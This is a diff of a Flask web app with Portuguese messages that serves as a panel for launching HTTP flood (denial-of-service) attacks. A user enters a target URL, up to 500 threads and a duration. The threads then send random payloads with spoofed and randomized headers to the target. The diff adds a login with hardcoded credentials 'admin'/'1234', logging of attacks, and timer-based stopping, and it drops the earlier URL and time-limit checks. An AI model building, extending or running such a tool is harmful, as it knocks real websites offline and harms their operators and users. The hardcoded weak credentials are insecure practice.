@@ -1,20 +1,22 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify
 import threading
 import requests
 import random
 import string
-import time
+import datetime
 
 app = Flask(__name__)
+app.secret_key = 'segredo123'  # 🔥 Troca depois por algo forte!
 
-# Dados do ataque
+# Login
+USUARIO = 'admin'
+SENHA = '1234'
+
+# Variáveis de ataque
 alvo = ""
 threads = 0
 rodando = False
 lock = threading.Lock()
-
-# Logs dos ataques
-logs_ataques = []
 
 def gerar_payload(tamanho=2048):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=tamanho))
@@ -22,26 +24,20 @@ def gerar_payload(tamanho=2048):
 def gerar_headers():
     headers = {
         "User-Agent": random.choice([
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
-            "curl/7.68.0",
-            "Wget/1.20.3"
+            "Mozilla/5.0", "curl/7.68.0", "Wget/1.20.3"
         ]),
         "Referer": random.choice([
-            "https://google.com", "https://bing.com", "https://yahoo.com", "https://duckduckgo.com"
+            "https://google.com", "https://bing.com"
         ]),
-        "Accept-Encoding": "gzip, deflate",
-        "Accept-Language": "en-US,en;q=0.9",
     }
-    for _ in range(20):
+    for _ in range(10):
         fake_key = "X-Fake-" + ''.join(random.choices(string.ascii_letters, k=5))
         fake_value = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
         headers[fake_key] = fake_value
     return headers
 
 def flood():
+    global rodando
     while rodando:
         try:
             payload = gerar_payload()
@@ -51,72 +47,79 @@ def flood():
         except:
             pass
 
-def parar_apos_tempo(tempo):
-    global rodando
-    time.sleep(tempo)
-    rodando = False
-    print(f"🛑 Ataque finalizado após {tempo} segundos!")
+def registrar_log(alvo, codigo):
+    data = datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')
+    with open("logs.txt", "a") as f:
+        f.write(f"URL:{alvo} DATA&HORA:{data} CÓDIGO:{codigo}\n")
 
-@app.route('/')
-def home():
-    return render_template('index.html', logs=logs_ataques)
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        if request.form['usuario'] == USUARIO and request.form['senha'] == SENHA:
+            session['logado'] = True
+            return redirect(url_for('painel'))
+        else:
+            return "Acesso negado."
+    return '''
+    <form method="post">
+        <input type="text" name="usuario" placeholder="Usuário"><br>
+        <input type="password" name="senha" placeholder="Senha"><br>
+        <button type="submit">Entrar</button>
+    </form>
+    '''
+
+@app.route('/painel')
+def painel():
+    if not session.get('logado'):
+        return redirect('/')
+    return render_template('index.html')
 
 @app.route('/start', methods=['POST'])
 def start():
-    global threads, rodando, alvo
+    global alvo, threads, rodando
 
     if rodando:
-        return jsonify({'status': 'erro', 'mensagem': '⚠️ Já existe um ataque rodando. Pare antes de iniciar outro.'})
+        return jsonify({'status': 'erro', 'mensagem': '⚠️ Já está em execução!'})
 
-    alvo = request.form.get('alvo', '')
-    threads = int(request.form.get('threads', 100))
-    tempo = int(request.form.get('tempo', 60))
+    alvo = request.form.get('alvo')
+    threads = int(request.form.get('threads'))
+    tempo = int(request.form.get('tempo'))
 
     if threads > 500:
-        return jsonify({'status': 'erro', 'mensagem': '❌ Limite máximo é 500 threads.'})
-
-    if tempo > 200:
-        return jsonify({'status': 'erro', 'mensagem': '❌ Tempo máximo é 200 segundos.'})
-
-    if not alvo.startswith('http'):
-        return jsonify({'status': 'erro', 'mensagem': '❌ URL inválida. Inclua http:// ou https:// no começo.'})
+        return jsonify({'status': 'erro', 'mensagem': '❌ Máximo 500 threads!'})
 
     rodando = True
+    codigo = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    registrar_log(alvo, codigo)
 
-    # Adiciona no log
-    logs_ataques.append({
-        'alvo': alvo,
-        'threads': threads,
-        'tempo': tempo,
-        'status': '🟢 Ativo'
-    })
-
-    # Inicia threads
     for _ in range(threads):
         t = threading.Thread(target=flood)
         t.daemon = True
         t.start()
 
-    # Thread para parar após tempo
-    t_parar = threading.Thread(target=parar_apos_tempo, args=(tempo,))
-    t_parar.start()
+    timer = threading.Timer(tempo, parar_ataque)
+    timer.start()
 
-    return jsonify({'status': 'ok', 'mensagem': f'🚀 Ataque iniciado no {alvo} com {threads} threads por {tempo} segundos.'})
+    return jsonify({'status': 'ok', 'mensagem': f'🚀 Ataque iniciou contra {alvo} por {tempo} segundos com {threads} threads. Código: {codigo}'})
 
 @app.route('/stop', methods=['POST'])
 def stop():
-    global rodando
     if not rodando:
-        return jsonify({'status': 'erro', 'mensagem': '⚠️ Nenhum ataque em andamento.'})
+        return jsonify({'status': 'erro', 'mensagem': '⚠️ Nenhum ataque ativo.'})
+    parar_ataque()
+    return jsonify({'status': 'ok', 'mensagem': '🛑 Ataque parado.'})
 
+def parar_ataque():
+    global rodando
     rodando = False
-    logs_ataques[-1]['status'] = '🔴 Parado manualmente'
-
-    return jsonify({'status': 'ok', 'mensagem': '🛑 Ataque parado com sucesso.'})
 
 @app.route('/logs')
 def logs():
-    return jsonify(logs_ataques)
+    if not session.get('logado'):
+        return redirect('/')
+    with open("logs.txt", "r") as f:
+        conteudo = f.read().replace('\n', '<br>')
+    return f"<h1>Logs:</h1><p>{conteudo}</p><a href='/painel'>Voltar</a>"
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
